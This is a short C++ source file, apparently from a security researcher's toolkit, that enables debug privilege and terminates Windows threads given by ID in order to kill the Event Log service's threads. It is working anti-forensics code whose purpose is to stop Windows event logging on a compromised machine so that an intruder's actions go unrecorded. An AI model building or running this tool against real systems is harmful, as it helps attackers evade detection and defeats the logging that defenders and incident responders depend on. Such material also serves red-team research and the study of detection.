/*
    TerminateEventLogThread.cpp
    Author：3gstudent@3gstudent
    Use to terminate Event Log thread
*/

#include <windows.h>

BOOL SetPrivilege()  
{  
    HANDLE hToken;   
    TOKEN_PRIVILEGES NewState;   
    LUID luidPrivilegeLUID;   
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)||!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidPrivilegeLUID))   
    {   
        printf("SetPrivilege Error\n");  
        return FALSE;   
    }   
    NewState.PrivilegeCount = 1;   
    NewState.Privileges[0].Luid = luidPrivilegeLUID;   
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
    if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))  
    {  
        printf("AdjustTokenPrivilege Errro\n");  
        return FALSE;  
    }  
    return TRUE;  
}
int main(int argc, char* argv[])
{	
	SetPrivilege();
	printf("TerminateThread TID:\n");   	
	for(int i=1;i<argc;i++)
	{	
		printf("%s\n",argv[i]);
		HANDLE hThread = OpenThread(0x0001, FALSE,atoi(argv[i]));
		if(TerminateThread(hThread,0)==0)
			printf("[!] TerminateThread Error, TID: %s \n",argv[i]);
		CloseHandle(hThread);
	}  
	return 0;
}
